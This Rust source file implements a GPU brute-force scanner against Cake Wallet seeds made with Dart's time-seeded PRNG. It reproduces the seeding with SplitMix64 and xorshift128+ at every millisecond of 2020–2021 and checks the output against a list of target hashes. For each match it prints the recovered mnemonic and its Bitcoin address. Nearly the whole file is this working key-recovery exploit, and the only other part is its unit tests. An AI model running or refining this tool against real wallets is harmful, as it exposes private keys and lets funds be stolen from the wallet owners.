#[cfg(feature = "gpu")]
use crate::scans::gpu_solver::GpuSolver;
use anyhow::Result;
#[cfg(feature = "gpu")]
use bip39::Mnemonic;
#[cfg(feature = "gpu")]
use hex;
#[cfg(feature = "gpu")]
use std::fs;
use tracing::{info, warn};

#[cfg(not(feature = "gpu"))]
pub fn run() -> Result<()> {
    anyhow::bail!("This scanner requires GPU acceleration. Please recompile with --features gpu");
}

/// Cake Wallet Dart PRNG Scanner (Full GPU)
/// Scans 2020-2021 timestamps to find vulnerable seeds
#[cfg(feature = "gpu")]
pub fn run() -> Result<()> {
    info!("Cake Wallet Dart PRNG Scanner (Full GPU)");
    info!("Reverse-engineering vulnerable seeds from time-based PRNG...");

    info!("Loading vulnerable mnemonic hashes...");
    let hashes_file = fs::read_to_string("data/cakewallet_vulnerable_hashes.txt")?;

    let mut target_hashes: Vec<Vec<u8>> = hashes_file
        .lines()
        .map(|line| line.trim().to_lowercase())
        .filter(|line| !line.is_empty())
        .map(|line| hex::decode(line).unwrap_or_default())
        .filter(|h| h.len() == 32)
        .collect();

    target_hashes.sort();

    info!("Loaded and sorted {} target hashes", target_hashes.len());

    let mut flat_hashes = Vec::with_capacity(target_hashes.len() * 32);
    for hash in &target_hashes {
        flat_hashes.extend_from_slice(hash);
    }

    // FIX: Scan full microsecond range. Most Android/iOS devices have millisecond
    // precision, so effective unique seeds = (range in ms). But we scan all μs
    // and let the GPU deduplicate via matching.
    let start_time_us = 1_577_836_800_000_000u64; // 2020-01-01 00:00:00 UTC
    let end_time_us   = 1_619_913_599_999_999u64; // 2021-05-01 23:59:59 UTC

    let total_us = end_time_us - start_time_us;

    info!(
        "Time range: {} to {} ({} μs = ~{} ms unique seeds)",
        start_time_us, end_time_us, total_us, total_us / 1000
    );

    // FIX: sample every millisecond (1000 μs). Most real devices have ≤1ms precision,
    // so sampling every ms covers the full reachable space. Previously only 5 samples/s
    // were taken, missing 99.9995% of the space.
    let step_us: u64 = 1_000;

    let solver = GpuSolver::new()?;
    info!("[GPU] Solver initialized");

    let batch_size = 10_000_000usize;
    let mut batch_timestamps: Vec<u64> = Vec::with_capacity(batch_size);

    let mut total_checked = 0u64;
    let mut found_count = 0;
    let start_time = std::time::Instant::now();

    let mut ts = start_time_us;
    while ts <= end_time_us {
        batch_timestamps.push(ts);
        ts += step_us;

        if batch_timestamps.len() >= batch_size {
            process_batch_gpu(&solver, &batch_timestamps, &flat_hashes, &mut found_count)?;
            total_checked += batch_timestamps.len() as u64;

            let elapsed = start_time.elapsed().as_secs_f64();
            let speed = total_checked as f64 / elapsed;
            let progress = (ts - start_time_us) as f64 / total_us as f64 * 100.0;

            info!(
                "Progress: {:.2}% - Speed: {:.2} M/s - Found: {}",
                progress,
                speed / 1_000_000.0,
                found_count
            );

            batch_timestamps.clear();
        }
    }

    if !batch_timestamps.is_empty() {
        process_batch_gpu(&solver, &batch_timestamps, &flat_hashes, &mut found_count)?;
        total_checked += batch_timestamps.len() as u64;
    }

    info!("Scan complete! Total iterations: {}", total_checked);
    info!("Vulnerable seeds found: {}", found_count);

    Ok(())
}

#[cfg(feature = "gpu")]
use bitcoin::bip32::{DerivationPath, Xpriv};
#[cfg(feature = "gpu")]
use bitcoin::secp256k1::Secp256k1;
#[cfg(feature = "gpu")]
use bitcoin::{Address, Network};
#[cfg(feature = "gpu")]
use std::str::FromStr;

#[cfg(feature = "gpu")]
fn process_batch_gpu(
    solver: &GpuSolver,
    timestamps: &[u64],
    flat_hashes: &[u8],
    found_count: &mut usize,
) -> Result<()> {
    let results = solver.compute_cake_hash(timestamps, flat_hashes)?;

    for &timestamp_us in &results {
        *found_count += 1;
        warn!("\n🎯 FOUND VULNERABLE SEED #{}", found_count);
        warn!("  Timestamp: {} μs", timestamp_us);

        // CPU verification
        let entropy = generate_dart_entropy(timestamp_us);
        if let Ok(mnemonic) = Mnemonic::from_entropy(&entropy) {
            warn!("  Mnemonic: {}", mnemonic);

            let mnemonic_str = mnemonic.to_string();
            let seed = crate::utils::electrum::mnemonic_to_seed(&mnemonic_str);
            let network = Network::Bitcoin;
            let secp = Secp256k1::new();

            // Cake Wallet derivation: m/0'/0/0 (Electrum-compatible)
            if let Ok(path) = DerivationPath::from_str("m/0'/0/0") {
                if let Ok(root) = Xpriv::new_master(network, &seed) {
                    if let Ok(child) = root.derive_priv(&secp, &path) {
                        let pubkey = child.to_keypair(&secp).public_key();
                        let compressed_pubkey = bitcoin::CompressedPublicKey(pubkey);
                        let address = Address::p2wpkh(&compressed_pubkey, network);
                        warn!("  ADDRESS (m/0'/0/0): {}", address);
                    }
                }
            }
        }
    }

    Ok(())
}

/// SplitMix64 — used by Dart VM to initialize xorshift128+ state from a seed.
/// This is the corrected implementation; previously used Java's LCG constant
/// 0x5DEECE66D which is completely wrong for Dart.
fn dart_splitmix64(state: &mut u64) -> u64 {
    *state = state.wrapping_add(0x9e3779b97f4a7c15u64);
    let mut z = *state;
    z = (z ^ (z >> 30)).wrapping_mul(0xbf58476d1ce4e5b9u64);
    z = (z ^ (z >> 27)).wrapping_mul(0x94d049bb133111ebu64);
    z ^ (z >> 31)
}

/// Generate 16 bytes of entropy using Dart's Random(seed) xorshift128+.
///
/// Bug that was here before: state0 = seed, state1 = seed ^ 0x5DEECE66D
/// That constant is Java's java.util.Random LCG multiplier — completely unrelated
/// to Dart. Dart initializes both state words via two successive SplitMix64 steps.
pub fn generate_dart_entropy(seed: u64) -> [u8; 16] {
    // Dart Random(seed) initializes xorshift128+ state via SplitMix64
    let mut sm = seed;
    let mut state0 = dart_splitmix64(&mut sm);
    let mut state1 = dart_splitmix64(&mut sm);

    // Guard: xorshift128+ must not start in all-zero state
    if state0 == 0 && state1 == 0 {
        state0 = 0x9e3779b97f4a7c15u64;
        state1 = 0x6c62272e07bb0142u64;
    }

    let mut entropy = [0u8; 16];
    for byte in &mut entropy {
        // xorshift128+ step (matches Dart VM source)
        let s0 = state0;
        let s1 = state1 ^ s0;
        let result = s0.wrapping_add(state1); // output = pre-update sum

        state0 = s0.rotate_left(55) ^ s1 ^ (s1 << 14);
        state1 = s1.rotate_left(36);

        // nextInt(256) via 128-bit multiply reduction (matches Dart's implementation)
        let x_hi = result >> 32;
        let x_lo = result & 0xFFFFFFFF;
        let res = (x_hi * 256) + ((x_lo * 256) >> 32);
        *byte = (res >> 32) as u8;
    }

    entropy
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dart_entropy_reproducibility() {
        let seed = 1_609_459_200_000_000u64; // 2021-01-01 00:00:00.000000 UTC
        let entropy = generate_dart_entropy(seed);

        assert_eq!(entropy.len(), 16);

        // Must be deterministic
        let entropy2 = generate_dart_entropy(seed);
        assert_eq!(entropy, entropy2);

        // Must not be all zeros
        assert_ne!(entropy, [0u8; 16]);
    }

    #[test]
    fn test_different_seeds_produce_different_entropy() {
        // Previously, due to the broken state init, close timestamps could
        // collide or produce wrong distributions.
        let e1 = generate_dart_entropy(1_609_459_200_000_000u64);
        let e2 = generate_dart_entropy(1_609_459_200_001_000u64); // +1 ms
        let e3 = generate_dart_entropy(1_609_459_200_002_000u64); // +2 ms

        assert_ne!(e1, e2);
        assert_ne!(e2, e3);
        assert_ne!(e1, e3);
    }

    #[test]
    fn test_splitmix64_avalanche() {
        // SplitMix64 should exhibit strong avalanche: similar seeds → very different states
        let mut sm1 = 1_609_459_200_000_000u64;
        let mut sm2 = 1_609_459_200_000_001u64; // 1 μs later

        let s1 = dart_splitmix64(&mut sm1);
        let s2 = dart_splitmix64(&mut sm2);

        // Should differ in many bits (avalanche property)
        let diff = (s1 ^ s2).count_ones();
        assert!(diff > 10, "SplitMix64 should have strong avalanche, got {} differing bits", diff);
    }
}
